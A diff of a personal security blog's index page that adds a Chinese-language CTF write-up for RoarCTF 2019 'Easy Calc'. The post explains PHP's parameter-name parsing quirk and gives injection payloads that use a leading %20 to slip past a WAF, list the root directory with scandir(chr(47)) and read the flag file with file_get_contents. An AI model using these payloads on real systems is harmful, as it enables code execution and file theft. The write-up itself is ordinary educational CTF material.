@@ -169,12 +169,12 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">12</span>
+          <span class="site-state-item-count">13</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
       <div class="site-state-item site-state-tags">
-        <span class="site-state-item-count">10</span>
+        <span class="site-state-item-count">11</span>
         <span class="site-state-item-name">tags</span>
       </div>
   </nav>
@@ -203,6 +203,83 @@
 
 
     <div class="main-inner index posts-expand">
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://123-prog.github.io/2021/03/10/RoarCTF-2019-Easy-Calc/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar2.jpg">
+      <meta itemprop="name" content="Guangyue">
+      <meta itemprop="description" content="2571374157@qq.com">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="nappingCat's Blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2021/03/10/RoarCTF-2019-Easy-Calc/" class="post-title-link" itemprop="url">(RoarCTF 2019) Easy Calc</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+      
+
+      <time title="Created: 2021-03-10 14:46:42 / Modified: 15:26:44" itemprop="dateCreated datePublished" datetime="2021-03-10T14:46:42+08:00">2021-03-10</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h3 id="0x01-php变量解析漏洞"><a href="#0x01-php变量解析漏洞" class="headerlink" title="0x01 php变量解析漏洞"></a>0x01 php变量解析漏洞</h3><p>起因是get,post或其他方法获取来的变量如果不符合php的变量规则，php会对其进行适当的转换，更改为符合规则的变量名。主要是将某些字符删除或者替换成下划线。接下来看一下主要是哪些字符会引发这个操作</p>
+<p>php的变量规则：<code>&#39;^[a-zA-Z_\x80-\xff][a-zA-Z0-9_\x80-\xff]*$&#39;</code>。这里的\80-\xff是ASCII的扩展码，其中包括一些数学符号，音符等等，这里既然这些符号是符合php变量规则的，我们就不必测试这些扩展码了。</p>
+<p>在php中<code>parse_str()</code>函数和 $_GET，$_POST 在 PHP 中填充变量相似，也使用了同样的机制，所以测试代码中使用这个函数来代替</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">&#x2F;*</span><br><span class="line">parse_str会对指定的字符串进行解析并转化为有效的变量名，有些非法的变量名就会进行替换，</span><br><span class="line">比如替换成下划线，或者之间删去，这个程序测试哪些字符会被替换成空或者下划线</span><br><span class="line">*&#x2F;</span><br><span class="line">$test_list &#x3D; [&quot;&#123;&#125;test_val&quot;,&quot;test&#123;&#125;_val&quot;,&quot;test_val&#123;&#125;&quot;];</span><br><span class="line">foreach($test_list as $key&#x3D;&gt;$val)</span><br><span class="line">&#123;</span><br><span class="line">    for($i&#x3D;0;$i&lt;127;$i++)</span><br><span class="line">    &#123;</span><br><span class="line">        $new_val &#x3D; str_replace(&quot;&#123;&#125;&quot;,chr($i),$val);</span><br><span class="line">        parse_str($new_val,$output);</span><br><span class="line">        if(isset($output[&#39;test_val&#39;]))</span><br><span class="line">        &#123;</span><br><span class="line">            echo $i.&quot;:&quot;.chr($i).&quot; &#x3D;&gt;&quot;.&quot;删除&quot;.&quot;\n&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">        if(isset($output[&#39;_test_val&#39;])||isset($output[&#39;test__val&#39;])||isset($output[&#39;test_val_&#39;]))</span><br><span class="line">        &#123;</span><br><span class="line">            echo $i.&quot;:&quot;.chr($i).&quot; &#x3D;&gt;&quot;.&quot;_\n&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    echo &quot;\n&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>结果是:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">32:  &#x3D;&gt;删除</span><br><span class="line">38:&amp; &#x3D;&gt;删除</span><br><span class="line">43:+ &#x3D;&gt;删除</span><br><span class="line">46:. &#x3D;&gt;_</span><br><span class="line">95:_ &#x3D;&gt;_</span><br><span class="line"></span><br><span class="line">32:  &#x3D;&gt;_</span><br><span class="line">43:+ &#x3D;&gt;_</span><br><span class="line">46:. &#x3D;&gt;_</span><br><span class="line">91:[ &#x3D;&gt;_</span><br><span class="line">95:_ &#x3D;&gt;_</span><br><span class="line"></span><br><span class="line">0: &#x3D;&gt;删除</span><br><span class="line">32:  &#x3D;&gt;_</span><br><span class="line">38:&amp; &#x3D;&gt;删除</span><br><span class="line">43:+ &#x3D;&gt;_</span><br><span class="line">46:. &#x3D;&gt;_</span><br><span class="line">61:&#x3D; &#x3D;&gt;删除</span><br><span class="line">91:[ &#x3D;&gt;_</span><br><span class="line">95:_ &#x3D;&gt;_</span><br></pre></td></tr></table></figure>
+<p>也可以看出在变量中间，开头，结尾插入不符合规则的字符时，处理的方式也不一样</p>
+<h3 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h3><p>题目很简单，waf也只是限制了变量不能为字符串，利用上面的解析漏洞，我们 传入的变量如果有一些特殊的符号就可以绕过这个waf,如果在之后的解析中，这个特殊符号被替换为空了，不就达到目的了</p>
+<p>这里采用在传参的时候给参数前面加个空格%20</p>
+<p><code>/calc.php?%20num=s</code>成功传入</p>
+<p><code>/calc.php?%20num=print_r(scandir(chr(47)))</code>扫根目录，这里/被过滤，利用函数生成</p>
+<p>发现flag文件，打开得到flag</p>
+<p><code>/calc.php?%20num=file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103))</code></p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
 
     
 
@@ -843,79 +920,6 @@
           <!--noindex-->
             <div class="post-button">
               <a class="btn" href="/2021/01/16/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day2-Web1-Hack-World/#more" rel="contents">
-                Read more &raquo;
-              </a>
-            </div>
-          <!--/noindex-->
-        
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
-    <link itemprop="mainEntityOfPage" href="https://123-prog.github.io/2021/01/15/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-BabySQL/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar2.jpg">
-      <meta itemprop="name" content="Guangyue">
-      <meta itemprop="description" content="2571374157@qq.com">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="nappingCat's Blog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2021/01/15/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-BabySQL/" class="post-title-link" itemprop="url">极客大挑战 2019 BabySQL</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">Posted on</span>
-      
-
-      <time title="Created: 2021-01-15 22:48:25 / Modified: 23:35:33" itemprop="dateCreated datePublished" datetime="2021-01-15T22:48:25+08:00">2021-01-15</time>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <h3 id="1-寻找注入点"><a href="#1-寻找注入点" class="headerlink" title="1.寻找注入点"></a>1.寻找注入点</h3><p>get型注入，在password处可进行注入，并且可以判断闭合类型为单引号闭合</p>
-<p><img src="/2021/01/15/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-BabySQL/Snipaste_2021-01-15_23-04-10.png"></p>
-          <!--noindex-->
-            <div class="post-button">
-              <a class="btn" href="/2021/01/15/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-BabySQL/#more" rel="contents">
                 Read more &raquo;
               </a>
             </div>
